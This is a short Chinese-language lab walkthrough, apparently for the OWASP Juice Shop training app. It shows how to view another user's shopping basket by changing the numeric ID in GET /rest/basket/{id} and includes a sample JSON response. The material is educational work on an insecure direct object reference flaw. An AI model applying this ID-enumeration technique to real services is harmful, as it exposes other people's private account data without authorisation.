- View Basket
    - 说明：查看其他用户的购物车。
    - 导航至购物篮页面，在拦截代理服务器或浏览器开发者工具栏中的对应请求
        ```GET /rest/basket/1 HTTP/1.1```
        响应为
        ```json
        {
            "status": "success",
            "data": {
                "id": 1,
                "coupon": null,
                "UserId": 1,
                "createdAt": "2025-12-11T09:26:03.460Z",
                "updatedAt": "2025-12-11T09:26:03.460Z",
                "Products": [{
                    "id": 3,
                    "name": "Eggfruit Juice (500ml)",
                    "description": "Now with even more exotic flavour.",
                    "price": 8.99,
                    "deluxePrice": 8.99,
                    "image": "eggfruit_juice.jpg",
                    "createdAt": "2025-12-11T09:26:02.865Z",
                    "updatedAt": "2025-12-11T09:26:02.865Z",
                    "deletedAt": null,
                    "BasketItem": {
                        "ProductId": 3,
                        "BasketId": 1,
                        "id": 3,
                        "quantity": 1,
                        "createdAt": "2025-12-11T09:26:03.642Z",
                        "updatedAt": "2025-12-11T09:26:03.642Z"
                    }
                }]
            }
        }
        ```
        - 猜测 URL 的数字参数 ```/rest/basket/1``` 即为购物篮 ID ```"BasketId": 1```
        - 请求
            ```GET /rest/basket/2 HTTP/1.1```
            访问到其他用户的购物篮，确认
            ```data id``` ```data UserId``` ```BasketItem ProductId``` 
            均对应 URL 参数的数字